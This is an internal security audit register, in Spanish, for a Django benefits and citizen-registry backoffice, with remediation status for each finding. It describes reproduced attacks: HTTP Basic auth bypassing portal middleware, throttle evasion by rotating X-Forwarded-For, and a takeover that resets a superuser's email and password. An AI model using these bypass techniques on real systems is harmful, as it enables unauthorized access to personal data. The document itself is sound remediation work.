# 4.1 Seguridad y autorización (SEC, G1-01/02, G1c)

Fichas completas del dominio. Convenciones de ficha, `V-STD` y `V-UI`: ver README §0.
Base verificada: `origin/development @ 917e583`. PoC: `poc/test_repro_seguridad.py` (salvo que se indique otro).

**Causa raíz transversal (verificada en V1).**
1. DRF sin defaults: `config/settings.py:404-413` no fija `DEFAULT_AUTHENTICATION_CLASSES` ni `DEFAULT_PERMISSION_CLASSES`. Rigen `Session + Basic` y `AllowAny`. Basic autentica **dentro** de la vista, después de los middlewares (portal, sesión única, clave provisoria), que ven un anónimo.
2. `puede()` sin programa: `requiere` y `CapacidadRequeridaMixin` (`core/rbac.py:675`, `:704`) llaman `puede_alguna` sin programa; con `programa=None` se suman las capacidades de **todos** los roles del usuario (`rbac.py:569-570`).
3. El `CATALOGO` no acota los módulos `becas_*` ni `programas` (`rbac.py:46-237`), así que `_modulo_asignable_en_programa` (`:417-426`) los ofrece en cualquier programa y `RolForm.clean` (`users/forms/roles.py:137-146`) los acepta.
4. Vistas de legajos y dashboard con solo `login_required` / `IsAuthenticated`, mientras las pantallas equivalentes exigen `ciudadano.*`.

| ID | Título | Sev. | Estado | Ola | Esf. | Avance 03-oct |
|---|---|---|---|---|---|---|
| SEC-01 | HTTP Basic en `/api/` saltea portal, sesión única y clave provisoria | CRÍTICA | CONF. test | 0 (hecho) / 2 (hecho) | S | ✅ |
| SEC-02 | `CiudadanoViewSet`: CRUD del padrón para cualquier autenticado | CRÍTICA | CONF. test | 0 | S | ✅ |
| SEC-03 | Admin de usuarios de un programa toma cuentas de superusuarios, admins globales y multiprograma | CRÍTICA | CONF. test | 0 | M | ✅ |
| SEC-04 | Consulta RENAPER anónima con payload crudo y throttle evadible | CRÍTICA | CONF. test | 0 | S | ✅ |
| SEC-05 | `activate`/`deactivate` de usuarios por API para cualquier autenticado | CRÍTICA | CONF. test | 0 | S | ✅ |
| SEC-10 | Adjuntos de ciudadano/legajo sin capacidad ni pertenencia: cualquier autenticado **borra** el documento | CRÍTICA (04-oct) | CONF. test | 2 → **R (en R-19)** | S-M | ✅ |
| SEC-06 | Capacidades `becas.*` otorgables en roles de otro programa | ALTA | CONF. test | 2 | M | ⬜ |
| SEC-07 | `programa.configurar` en un rol de programa habilita el wizard de todos | ALTA | CONF. test | 2 | S-M | ⬜ |
| SEC-08 | XSS almacenado por nombre de rol en todas las páginas | ALTA | CONF. test | 0 | S | ✅ |
| SEC-09 | `/media/` sin login en DEV (nginx); sin pertenencia en ECOM | ALTA (DEV) / MEDIA (ECOM) | CONF. test | 0 (etapa 1) / 2 (etapa 2) | S + M | 🟡 |
| SEC-11 | APIs JSON de legajos (riesgo, alertas, timeline) sin capacidad | ALTA | CONF. test | **R-19** (`ciudadano.ver` de piso en las 5) / 2 (subir 3 a `ciudadano.sensible`, D-11) | S | ✅ |
| SEC-12 | Derivaciones por GET (CSRF) sin capacidad; inscripción por `is_staff` | ALTA | CONF. test | 2 | S | ✅ |
| SEC-13 | Catálogo geográfico escribible por API | ALTA | CONF. test | 0 | S | ✅ |
| SEC-14 | APIs del dashboard: enumeración del padrón y alertas globales | ALTA | CONF. test | 0 | S | ✅ |
| SEC-29 | Registro del portal sobre cualquier legajo con solo el DNI | ALTA | CONF. test | 0 | S | 🟡 |
| G1-01 | Chat público crea legajos de cualquier DNI con nombre falso que llegan a SIIS | ALTA | CONF. lectura | 0 | S | 🟡 |
| G1-02 | Segundo oráculo RENAPER anónimo en `/conversaciones/consultar-renaper/` | ALTA | CONF. lectura | 0 | S | ✅ |
| SEC-15 | Uploads de F-00 y merenderos sin lista blanca ni tope | MEDIA | CONF. test | 2 | S | ⬜ |
| SEC-16 | `/api/users/` lista personal con DNI e `is_superuser` | MEDIA | CONF. test | 0 | (en SEC-05) | ✅ |
| SEC-17 | La API de usuarios/roles saltea reglas del ABM | MEDIA | CONF. test | 0 | (en SEC-05) | ✅ |
| SEC-18 | Alertas: cerrar cualquiera por id; CRÍTICAS globales a quien no tiene legajos | MEDIA | CONF. test | 2 → **R (en R-19)** | S | ✅ |
| SEC-19 | XSS en `/legajos/alertas/debug/` y rutas de prueba publicadas | MEDIA | CONF. test | 0 | S | ✅ |
| SEC-20 | Inyección de fórmulas en CSV/XLSX (incluye export de ciudadanos) | MEDIA | CONF. lectura | 2 | S | ✅ |
| SEC-21 | Cupo: el Coordinador Regional ve y muta casos de sus pares | MEDIA | CONF. lectura | 2 | S | ✅ |
| SEC-22 | Reportes, XLSX y cupo ignoran RN-P13 | MEDIA | CONF. lectura | 2 | S-M | ✅ |
| SEC-23 | App de campo: PATCH y adjuntos sobre casos resueltos | MEDIA | CONF. lectura | 2 | S | ✅ |
| SEC-24 | La app se autovalida la identidad con `origen: personas` | MEDIA | CONF. lectura | 2 | M | ✅ |
| SEC-25 | `consultar_persona_becas` sin throttle | MEDIA | CONF. lectura | 2 | S | ✅ |
| SEC-26 | Login, admin, recupero, clave provisoria y token de campo sin límites ni rotación | MEDIA | CONF. test (parte) | 2 | M | 🟡 |
| SEC-27 | RENAPER con `verify=False` | MEDIA | CONF. lectura | 2 | S | 🟡 |
| G1c-04 | `/ws/alertas/` difunde fuera de alcance, sin Origin y sin revalidar | MEDIA | CONF. test | 2 | M | ✅ |
| SEC-30 | Requisitos/subsegmentos/coordinadores validados solo contra el segmento (Regional) | BAJA | CONF. lectura (latente) | 2 | S | ✅ |
| SEC-31 | Padrón .xlsx: límite solo sobre el comprimido (zip bomb) | BAJA | PLAUSIBLE | 2 | S | ⬜ |
| SEC-32 | Consulta RENAPER desde la admisión sin `ciudadano.*`, por GET | BAJA | CONF. lectura | 2 | S | ✅ |
| SEC-33 | El mapa del caso manda GPS a OpenStreetMap en cada apertura | BAJA | CONF. lectura | 2 | S | ✅ |
| SEC-34 | `EntregaMercaderiaCreateView` busca antes de autorizar | BAJA | CONF. lectura | 2 | S | ✅ |
| SEC-35 | Cookies seguras y HSTS dependen de `ENVIRONMENT=prd`; inactividad solo en JS | BAJA | PLAUSIBLE | 2 | S | 🟡 |
| SEC-36 | `programa_list` sin capacidad; errores con `str(exc)` al usuario | BAJA | CONF. lectura | 2 | S | ✅ |
| SEC-37 | Link público, paso 2: muestra nombre y fecha a partir de DNI + sexo | BAJA | CONF. (riesgo aceptado, Cambio 71) | 2 | S | ✅ |
| G1c-10 | `/admin/` y `admin/doc/` montados en todos los entornos | BAJA | CONF. ajustado | 2 | S | 🟡 |
| G1c-16 | Payload crudo de RENAPER en sesión (24 h) y caché (10 min) | BAJA | CONF. lectura | 2 | S | ✅ |
| R0-01 | `/conversaciones/<id>/evaluar/` acepta escritura anónima | BAJA (MINOR) | revisión Ola 0 | 0 | S | ✅ |
| R0-05 | `DEFAULT_THROTTLE_RATES["renaper"]` sin consumidor | BAJA (MINOR) | revisión Ola 0 | 2 (con SEC-25) | incluido en SEC-25 | ✅ |
| R0b-04 | `retrieve` de `/api/legajos/ciudadanos/<pk>/` da 404 sin `?search=` | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Legajos) | S | ✅ |
| R0b-05 | `CiudadanoViewSet` declara `ordering` sin `OrderingFilter`: pagina sin orden | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Legajos) | incluido en R0b-04 | ✅ |
| R0b-06 | `AlertasViewSet` sin capacidad decidida | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (con SEC-18) | incluido en SEC-18 | ✅ |
| R0b-07 | `config/urls.py` monta `/media/` abierto con `DEBUG=True` antes del bloque `SERVE_MEDIA` | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Media) | S | ⬜ |
| R0b-08 | Comentarios que todavía dicen que nginx sirve `/media/` | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Media) | incluido en R0b-07 | ⬜ |
| R0b-09 | `actividad_reciente` pide `ciudadano.sensible` pero muestra inscripciones y derivaciones sin alcance | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Legajos) | S | 🟡 |
| R0b-11 | Desplegar SEC-09 etapa 1 en icore-srv (`web` antes que `nginx`) | — (operativo, PM) | revisión Ola 0 (2ª tanda) | PM | — | ⬜ |

---

## CRÍTICA

### SEC-01 · HTTP Basic en `/api/` saltea la barrera portal/backoffice, la sesión única y la clave provisoria
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC01BasicAuthTests`, 2 tests) · **Origen:** A5-01, A3-02 (parte Basic) · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** 🟡 Parcial en #509 (Cambio 100), 01-oct-2026 — hecho el punto 1: `DEFAULT_AUTHENTICATION_CLASSES = [SessionAuthentication]` y `DEFAULT_PERMISSION_CLASSES = [IsAuthenticated]`; Basic ya no autentica en `/api/` y el ciudadano con sesión cae en `PortalCiudadanoMiddleware`. Punto 2 hecho el 03-oct-2026 sobre toda la lista de la ficha: #536 (Cambio 109) crea `BackofficeAutenticado` en `core/api_permissions.py` (#541 le suma `is_active` y deja fail-closed al superusuario dentro de `Ciudadanos`); se aplica en `users` (#540, Cambio 113: solo queda `UsuarioActualView`), `legajos` (#542, Cambio 114: `CiudadanoViewSet`, `AlertasViewSet`, `HistorialContactoViewSet`, `VinculoFamiliarViewSet`), `core/api_views` (6 ViewSets) y las 5 vistas de `dashboard/api_views` (#541, Cambio 115). **Falta (verificado contra `719dc0a`):** vistas DRF del backoffice fuera de la lista de la ficha que siguen sin `BackofficeAutenticado`: las 4 de `conversaciones/api_views` (`@login_required` + default; se van con la fase 2 de G1-01), las 8 de `core/views/performance.py` (`IsPerformanceAdmin`/`IsAdminUser`; se van con OPS-10), `SpectacularAPIView`/`SwaggerView`/`RedocView` (`config/urls.py:55-57`, `login_required` + `AllowAny` de Spectacular) y las raíces de los `DefaultRouter` de `/api/legajos/` y `/api/core/`. Ninguna es explotable hoy (sesión solo por cookie → el middleware frena al ciudadano; las de performance piden `config.administrar`/`is_staff`), así que el resto pasa a la **Ola 2, PR 8** (2 h). La app de campo (`programas/api/views.py`, Token + `CampoBecasPermission`) no es backoffice y queda fuera. Operativo: H-08 con ECOM. Seguimiento: R0-04 (raíz `/api/becas/` con Token).

**Resolución:** ✅ Completa en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — el resto de la lista:
las **4** vistas de `conversaciones/api_views` (montadas bajo dos prefijos), las **8** de
`core/views/performance.py`, las **3** pantallas de Spectacular (`SERVE_PERMISSIONS` en
`SPECTACULAR_SETTINGS`: el `login_required` del URLconf envolvía una vista que por dentro decía
`AllowAny`) y las **raíces** de los routers de `/api/legajos/` y `/api/core/`, que pasan por el
`RouterBackoffice` nuevo (`core/api_routers.py`). Ninguna era explotable —la sesión viaja por cookie y
`PortalCiudadanoMiddleware` frena al ciudadano antes de la vista—, así que lo que cierra la ficha no es
un agujero sino el **molde**: en vez de una lista escrita a mano, un contrato que recorre el URLconf y
exige `BackofficeAutenticado` en **toda** vista DRF, con la app de campo (`/api/becas/`, Token +
`CampoBecasPermission`) como única excepción declarada. Una vista DRF nueva nace con el permiso puesto
o el test se pone rojo. **Lo que no cambia:** la decisión del 26/08/2026 de dejar la documentación de
la API detrás de **login** y no detrás de capacidad —un usuario de backoffice sin rol la sigue viendo—.
`/api/becas/` queda fuera a propósito (R0-04). **Test permanente:**
`core.tests.test_api_backoffice_permiso.PermisoDeLaApiDelBackofficeTests.test_todas_declaran_backoffice_autenticado`
(y `.test_el_barrido_ve_las_que_tiene_que_ver`, que impide que un barrido vacío dé verde).
- **Ubicación:** `config/settings.py:404-413` (`REST_FRAMEWORK`); middlewares `core/middleware.py:81-95` (`PortalCiudadanoMiddleware`), `users/middleware.py:9-66` (sesión única y clave provisoria; exime `/api/` a propósito).
- **Escenario (reproducido):** (1) un anónimo se registra en `/portal/mi-perfil/registro/` con el DNI de un `Ciudadano` existente (SEC-29); (2) con sesión, `/api/users/users/` da 302; (3) con `Authorization: Basic <dni>:<clave>`: `/api/users/users/` → 200 (lista el personal), `/api/legajos/ciudadanos/` → 200 (padrón), `/api/buscar-ciudadanos/?q=301` → 200, POST `/api/core/provincias/` → 201; (4) un territorial (solo `becas.campo`, con el login web prohibido por `users/forms/auth.py:44-51`) recibe 200 en `/api/legajos/ciudadanos/` por Basic. nginx reenvía `Authorization` sin tocarlo.
- **Causa raíz:** causa transversal 1.
- **Propuesta:**
  1. En `config/settings.py`, dentro de `REST_FRAMEWORK`:
     ```python
     "DEFAULT_AUTHENTICATION_CLASSES": ["rest_framework.authentication.SessionAuthentication"],
     "DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.IsAuthenticated"],
     ```
     No hace falta `TokenAuthentication` global: la app de campo ya lo declara en `programas/api/views.py:213`, `:258` y `:442`; `ObtainCampoToken` hereda `permission_classes = ()` de `ObtainAuthToken`, así que el login de la app sigue andando. **Verificado:** con este cambio, 114 tests (`test_becas_api`, `users.tests.test_api_rbac`, `legajos`, `dashboard` y el PoC) con 0 regresiones; solo los 2 PoC de SEC-01 pasan a 403.
  2. Defensa en profundidad (recomendada): `core/api_permissions.py` con `class BackofficeAutenticado(BasePermission)` → `request.user.is_authenticated and not rbac.es_ciudadano_portal(request.user)`, como primer elemento de `permission_classes` en `CiudadanoViewSet`, `AlertasViewSet`, `UserViewSet`, `GroupViewSet`, `ProfileViewSet`, los ViewSets de `core/api_views` y las 5 vistas de `dashboard/api_views` (las vistas con `permission_classes` explícitas **no heredan** el default). `RequiereCapacidad(*codigos)` **ya existe** en ese archivo (fábrica de permiso DRF que llama `rbac.puede_alguna`; hoy la usa `users/api_views`): reusarla en SEC-02/05/13/14, no redefinirla.
  3. Cerrar la puerta de entrada: SEC-29.
- **Tests a agregar:** `core/tests/test_api_auth.py`: `test_basic_auth_rechazada_en_api_backoffice` (`APIClient` con `HTTP_AUTHORIZATION="Basic …"` contra `/api/users/users/`, `/api/legajos/ciudadanos/`, `/api/buscar-ciudadanos/?q=123` → 401/403); `test_token_campo_sigue_funcionando` (POST `/api/becas/auth/token/` y `GET /api/becas/relevamientos/` con `Token` → 200); `test_ciudadano_portal_con_sesion_no_entra_a_api` (→ 302).
- **Verificación:** V-STD + `manage.py test programas.tests.test_becas_api users legajos dashboard core`. Confirmar con ECOM que ningún monitoreo usa Basic contra `/api/` (el healthcheck está en `/health/`, fuera de DRF).
- **Dependencias:** ninguna. Se combina con SEC-29 en el mismo PR de Ola 0.

### SEC-02 · `CiudadanoViewSet`: CRUD completo del padrón para cualquier autenticado
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC02CiudadanoApiTests`) · **Origen:** A5-02, A3-02; incluye V1-NEW-03 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #542 (Cambio 114), 03-oct-2026 — `CiudadanoViewSet` pasa a `ReadOnlyModelViewSet` con `[BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")]`, `SearchFilter` en `filter_backends` (cierra V1-NEW-03) y queryset vacío con menos de 3 caracteres de `?search=` (la API contesta búsquedas, no listados); el serializer oculta `telefono`, `email` y `domicilio` sin `ciudadano.sensible`; el buscador de «Agregar familiar» sube su umbral a 3 caracteres. Tests en `legajos/tests/test_api_ciudadanos_rbac.py` (10). Seguimientos: R0b-04 (`retrieve` da 404 sin `?search=`) y R0b-05 (sin `OrderingFilter`).
- **Ubicación:** `legajos/api_views/__init__.py:36-51`; serializer `legajos/serializers/__init__.py:10-32`.
- **Escenario (reproducido):** un usuario sin roles hace PATCH `{"dni": "99999999"}` → 200 y el DNI cambia; DELETE → 204 (cascada sobre alertas, inscripciones y derivaciones). Además (V1-NEW-03) `search_fields` está declarado pero `filter_backends = [DjangoFilterBackend]` no incluye `SearchFilter`: el `?search=` de «Agregar familiar» (`ciudadano_detail.html:1224`) se ignora y devuelve 10 ciudadanos cualesquiera.
- **Causa raíz:** `ModelViewSet` con solo `IsAuthenticated`; serializer que deja escribir dni, nacimiento, teléfono, email y domicilio.
- **Propuesta:** pasar a `viewsets.ReadOnlyModelViewSet` (único consumidor: el GET `?search=` de `ciudadano_detail.html:1224`); `permission_classes = [BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")]`; en `to_representation`, borrar `email`, `telefono` y `domicilio` salvo `puede(user, "ciudadano.sensible")`; `filter_backends = [DjangoFilterBackend, SearchFilter]` y en `get_queryset` `if len(search) < 3: return qs.none()`.
- **Tests a agregar:** `legajos/tests/test_api_ciudadanos_rbac.py`: `test_sin_capacidad_403` (GET), `test_patch_y_delete_405` (con `ciudadano.editar` también), `test_con_ciudadano_ver_200_sin_sensibles`, `test_search_filtra_por_texto`, `test_search_vacio_devuelve_vacio`.
- **Verificación:** V-STD + `manage.py test legajos`. Probar en navegador que el buscador de «Agregar familiar» filtra (o queda retirado si LEG-03 decide B).
- **Dependencias:** SEC-01 (helpers `BackofficeAutenticado`, `RequiereCapacidad`). Relacionado con LEG-03.

### SEC-03 · El admin de usuarios de un programa toma la cuenta de un superusuario, de un admin global o de un usuario de otro programa
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC03TomaSuperusuarioTests`; ampliación en `poc/test_repro_usuarios.py::G1b01ToggleCrossProgramTests`, 2 tests) · **Origen:** A5-03, G1b-01 · **Ola:** 0 · **Esfuerzo:** M · **Decisión:** D-03 (email de multiprograma)

**Resolución:** ✅ Resuelto en #539 (Cambio 110), 03-oct-2026, incluida la ampliación G1b-01 — `puede_gestionar_usuario` rechaza al superusuario, a quien tenga `CAPS_ADMINISTRACION` y a quien tenga un rol activo con `CAPS_ADMIN_PROGRAMA` de un programa que el operador no administra; el nuevo `puede_gestionar_credenciales` exige que **todos** los roles del target estén en `alcance_roles_ids(operador)` (default de D-03), y si no, `CustomUserChangeForm` deshabilita usuario, correo y clave, `_apply_user_data` los ignora y el toggle se rechaza con aviso. TC-67-04 reescrito; tests en `users/tests/test_usuarios_abm.py::Sec03TomaDeCuentasTests`. Operativo: P-04 en PRD (R0b-12). Seguimientos: R0b-01 (help_text invisible), R0b-02 (rol desactivado), R0b-03 (P-04 incompleto), R0b-10 (botones en el listado).
- **Ubicación:** `users/selectors/usuarios.py:87-112` (`puede_gestionar_usuario`: True si el target tiene **un** rol activo del programa del operador); `users/forms/__init__.py:399-480` y `:423-432` (`CustomUserChangeForm` expone username, email y password); `users/services/admin.py:58-68` (`_apply_user_data` hace `set_password` y cambia email); `users/views/admin.py:150` (`UserToggleActivoView`, mismo chequeo).
- **Escenario (reproducido):** (a) un usuario con `programa.usuario.administrar` (rol de Becas) edita a `root` (superusuario con un rol «Operador Becas») → email `atacante@evil.test`, `check_password("Pwn3d-Clave-2026") == True`, y el toggle lo deja inactivo. (b) (G2) el admin de usuarios de Dispositivos **desactiva** al admin de Becas que además tiene un rol operativo de Dispositivos, y le cambia clave y email: el usuario conserva su rol de Becas con credenciales del atacante.
- **Causa raíz:** el chequeo de alcance mira «algún rol del programa», no «todos los roles del target»; no excluye superusuarios, admins globales (`CAPS_ADMINISTRACION`) ni admins de otro programa (`CAPS_ADMIN_PROGRAMA`).
- **Propuesta:**
  1. En `puede_gestionar_usuario`, rama de admin de programa, antes del `return` final:
     ```python
     if target.is_superuser or rbac.puede_alguna(target, rbac.CAPS_ADMINISTRACION):
         return False
     ```
     Cubre `UserUpdateView.get_object` y `UserToggleActivoView.post`, que ya lo llaman.
  2. Para el operador **no global**: puede editar username/email/password y usar el toggle **solo si todos** los roles activos del target están en `alcance_roles_ids(operador)`. Si no: en `CustomUserChangeForm.__init__`, `self.fields[x].disabled = True` para `username`, `email` y `password`; en el servicio, ignorar esos campos del POST; y `UserToggleActivoView.post` → 403. Además excluir siempre a quien tenga `CAPS_ADMIN_PROGRAMA` de **otro** programa.
  3. Registrar en `requerimientos.md` el ajuste de TC-67-04 (`users/tests/test_usuarios_abm.py:317`): hoy decide que el admin de programa cambia el email de un usuario multiprograma (Becas + Vivienda). Con el default de D-03, deja de poder hacerlo.
- **Tests a agregar:** en `users/tests/test_usuarios_abm.py`: `test_admin_programa_no_edita_superusuario` (GET y POST → redirect; clave y email intactos), `test_admin_programa_no_desactiva_admin_global`, `test_admin_programa_no_cambia_clave_de_multiprograma`, `test_admin_programa_no_desactiva_usuario_con_rol_de_otro_programa` (el de G1b-01 invertido). TC-67-04 se ajusta según D-03.
- **Verificación:** V-STD + `manage.py test users`. Pre-chequeo P-04 (README §3).
- **Dependencias:** G1b-02 (el mismo admin puede autootorgarse capacidades; Ola 2).

### SEC-04 · Consulta RENAPER anónima con el payload crudo y un throttle que se evade por `X-Forwarded-For`
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC04RenaperAnonimoTests`) · **Origen:** A5-04, A3-01, A2-01, V1-NEW-04 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** D-04 (incidente)

**Resolución:** ✅ Resuelto en #509 (Cambio 100), 01-oct-2026 — se borraron la ruta `/api/legajos/renaper/consultar/`, la vista `consultar_renaper_api` y `RenaperRateThrottle`; `legajos/tests/test_renaper_api.py` quedó como test invertido. `/api/becas/renaper/consultar/` sigue intacto. Queda operativo (D-04): revisar los logs de 90 días (P-15). Seguimiento: la tasa `renaper` quedó sin consumidor (R0-05).
- **Ubicación:** ruta `legajos/urls/api.py:15` (`renaper/consultar/`); vista `legajos/api_views/__init__.py:96-133` (`@permission_classes([AllowAny])`, devuelve `"datos_api": resultado.get("datos_api")` = `datos` crudo de RENAPER, `consulta_renaper.py:489`); rama de error `:113-121` devuelve `fallecido` (oráculo de defunción).
- **Escenario (reproducido):** un anónimo recibe 200 con `datos_api.calle` (calle, número, piso, provincia). 40/40 pedidos con `X-Forwarded-For` rotado dan 200; sin rotar, 429 en el pedido 31. Sin `NUM_PROXIES`, DRF 3.16 usa el XFF completo como identidad (`throttling.py:40`) y nginx conserva el valor del cliente. RENAPER está vivo en PRD (Cambio 79).
- **Consumidores:** ninguno. La app móvil dejó de usar esta ruta el 28-jun-2026 (commit `16f9ed6`; la usó del 24 al 28-jun desde `8a5d412`). Hoy la build de ECOM (`ecom/main 765696a`) llama a **`POST /api/becas/renaper/consultar/`**, que es un alias autenticado de `consultar_persona_becas` en `programas/api_urls.py:22`, y `origin/main` (`a66c2d3`) a `/api/becas/personas/consultar/`. En el backend solo la llama su test.
- **Propuesta:**
  1. Borrar `path("renaper/consultar/", …)` de `legajos/urls/api.py:15`, la vista `consultar_renaper_api` y `RenaperRateThrottle` de `legajos/api_views/__init__.py`.
  2. **No tocar** `programas/api_urls.py:22` (`/api/becas/renaper/consultar/`): lo usa la app en producción.
  3. Reescribir `legajos/tests/test_renaper_api.py`: `reverse("renaper_consultar")` → `NoReverseMatch`, o POST a la ruta vieja → 404.
  4. La tasa `"renaper": "30/min"` de settings puede quedar para SEC-25. Para cualquier throttle DRF por IP que quede: `core/api_throttling.py` con `class IPClienteMixin: def get_ident(self, request): return ip_cliente(request)` (reusa `core/services/throttle.py`). **No** usar `NUM_PROXIES` (es distinto en DEV —1, nginx— y en ECOM —ingress—).
  5. Revisar access logs de nginx (icore) y del ingress (ECOM) de los últimos 90 días: `grep "/api/legajos/renaper/consultar/"` y contar por IP.
- **Tests a agregar:** `legajos/tests/test_renaper_api.py::test_renaper_legacy_no_existe` (404); `programas/tests/test_becas_api.py::test_personas_consultar_becas_sigue_autenticado` (anónimo → 401) y `::test_alias_renaper_becas_sigue_autenticado` (`/api/becas/renaper/consultar/` con token → 200, anónimo → 401).
- **Verificación:** V-STD + `manage.py test legajos programas.tests.test_becas_api`.
- **Dependencias:** ninguna. Junto con G1-02 (segundo oráculo) en el mismo PR: si se cierra solo este, queda abierto el otro.

### SEC-05 · `activate` y `deactivate` de usuarios por API para cualquier autenticado
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC05ActivateDeactivateTests`) · **Origen:** A5-05 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** D-05 (apagar la API de usuarios)

**Resolución:** ✅ Resuelto en #540 (Cambio 113), 03-oct-2026, con el default de D-05 — `/api/users/` queda solo con `GET /api/users/me/` (`UsuarioActualView`, `[BackofficeAutenticado]`); se retiraron `UserViewSet`, `GroupViewSet` y `ProfileViewSet` (con `activate`, `deactivate`, `change_password` y `groups/<id>/users`) y sus serializers de escritura; todo lo demás bajo `/api/users/` da 404. Sin consumidores (grep). `me` se mudó de `/api/users/users/me/` a `/api/users/me/`. Tests en `users/tests/test_api_rbac.py` (11, con las PoC de SEC-05/16/17 invertidas). Cierra también SEC-16 y SEC-17.
- **Ubicación:** `users/api_views/__init__.py:53-57` (`get_permissions()` devuelve `[IsAuthenticated()]` para toda acción fuera de CRUD y pisa el `permission_classes` de los `@action` en `:93` y `:102`).
- **Escenario (reproducido):** un usuario plano hace POST `deactivate` → 200 y la víctima queda inactiva. Encadenado con SEC-01, lo hace un ciudadano del portal.
- **Propuesta (default D-05):** borrar `UserViewSet`, `GroupViewSet` y `ProfileViewSet` de `users/api_urls.py` y dejar solo `me` (no hay consumidores: el ABM web cubre todo). Cierra también SEC-16 y SEC-17. **Alternativa si D-05 = conservar:**
  ```python
  def get_permissions(self):
      if self.action in ("create", "update", "partial_update", "destroy", "activate", "deactivate"):
          return [BackofficeAutenticado(), RequiereCapacidad("usuario.administrar")()]
      if self.action in ("me", "change_password"):
          return [BackofficeAutenticado()]
      return [BackofficeAutenticado(), RequiereCapacidad(*rbac.CAPS_ENTRADA_ABM_USUARIOS)()]
  ```
  y `activate` dentro de `transaction.atomic()` delegando en un `UsuariosAdminService.toggle_activo(operador, user)` extraído de `UserToggleActivoView` (ya hace `asegurar_admin_restante(programa=…)`).
- **Tests a agregar:** `users/tests/test_api_rbac.py`: `test_deactivate_sin_capacidad_403` y `test_activate_sin_capacidad_403` (con la API apagada: `test_api_users_solo_me` → `resolve("/api/users/users/")` 404 y `/api/users/me/` 200).
- **Verificación:** V-STD + `manage.py test users`.
- **Dependencias:** SEC-01.

## ALTA

### SEC-06 · Las capacidades `becas.*` se otorgan en roles de otro programa y los gates no las acotan
**Severidad:** ALTA · **Estado:** CONFIRMADO-AJUSTADO con test (`SEC06BecasCrossProgramTests`) · **Origen:** A5-06; observación de A4 sobre los exports (refutada en su forma original, absorbida acá) · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** D-06
- **Ubicación:** `core/rbac.py:46-237` (catálogo sin `"programas"` en los módulos `becas_*`), `:417-426`; `users/forms/roles.py:137-146`; exports `programas/views/relevamientos.py:423`, `:462`, `:510` (`get_object_or_404(Convocatoria, pk=pk)` con `@requiere(CAP_REPORTES)`, `CAP_REPORTES = "becas.programa.administrar"` en `:57`); `ProgramaSiis` en `proceso_masivo.py:56`/`:101` y `configuracion.py:300`/`:615`; `RenaperPendientesListView.get_queryset` (`revision.py:443-469`).
- **Escenario (reproducido):** el admin de Dispositivos abre `/roles/crear/`, el árbol le ofrece `becas.programa.administrar`; crea el rol «Escalada» (Programa/Dispositivos) con `becas.programa.administrar` y `becas.programa.proceso_masivo` y se lo asigna. `puede(u, "becas.programa.administrar")` → True, `es_admin_becas(u)` → False. `GET /becas/convocatorias/<pk>/export/beneficiarios/` → 200 con DNI; `/becas/config/programas/<pk>/proceso-masivo/` → 200. Contraste: un Coordinador sin admin → 302 (la versión de A4 «un coordinador baja DNI cambiando el id» es **falsa**).
- **Causa raíz:** causas transversales 2 y 3.
- **Propuesta:**
  1. `core/rbac.py`: agregar `"programas": ("BECAS",),` a los módulos `becas_admin`, `becas_segmentos`, `becas_subsegmentos`, `becas_requisitos`, `becas_preguntas`, `becas_coordinadores`, `becas_convocatorias`, `becas_relevamientos`, `becas_revision`, `becas_cupo`, `becas_beneficiarios`, `becas_reportes` y `becas_campo` (y a `relevamientos` si el PM confirma que es solo de Becas; hoy solo lo usa un templatetag de ejemplo). Con eso `arbol_capacidades(solo_programa=True, programa=<no Becas>)` deja de ofrecerlas y `RolForm.clean` las descarta.
  2. Migración de datos `users/00XX_quitar_becas_de_roles_de_otros_programas`: quitar de `group.permissions` los codenames `becas_%` de todo Group con `meta.programa` no nulo y distinto de `codigo="BECAS"`. Antes de borrar, imprimir en la salida de la migración el listado (rol, capacidad). Correr antes en PRD la consulta P-02 (README §3).
  3. Exports (`convocatoria_export_*`): `get_object_or_404(convocatorias_visibles(request.user).select_related("segmento"), pk=pk)` y reemplazar `@requiere(CAP_REPORTES)` por `if not es_admin_becas(request.user): raise PermissionDenied`. En el mismo diff, `celda_segura` (SEC-20).
  4. `ProcesoMasivoView`, `proceso_masivo_lanzar` y `proceso_masivo_frenar`: `if not rbac.puede(request.user, CAP_PROCESO_MASIVO, programa=programa_becas(request.user)): raise PermissionDenied`.
  5. `RenaperPendientesListView.get_queryset`: sumar `relevamiento__convocatoria__in=convocatorias_visibles(user)`.
- **Tests a agregar:** `users/tests/test_roles_abm.py::test_admin_dispositivos_no_ve_ni_asigna_capacidades_becas` (GET sin el código en el árbol; POST con el código → el rol queda sin él); `programas/tests/test_convocatoria_export_alcance.py` (rol de otro programa con `becas.programa.administrar` inyectado → 403/404 en los 3 exports); `programas/tests/test_proceso_masivo.py::test_rechaza_capacidad_de_rol_de_otro_programa`; test de la migración (rol de Dispositivos con `becas_programa_administrar` → después no la tiene).
- **Verificación:** V-STD + `manage.py test users programas`.
- **Dependencias:** D-06 y P-02 antes de la migración. Mismo PR que SEC-20 para los exports.

### SEC-07 · `programa.configurar` tildada en un rol de programa habilita el wizard de **todos** los programas
**Severidad:** ALTA · **Estado:** CONFIRMADO-AJUSTADO con test (`SEC07ProgramaConfigurarTests`) · **Origen:** A5-07; V1-NEW-02 (corrección de la propuesta de P1) · **Ola:** 2 · **Esfuerzo:** S-M · **Decisión:** D-07
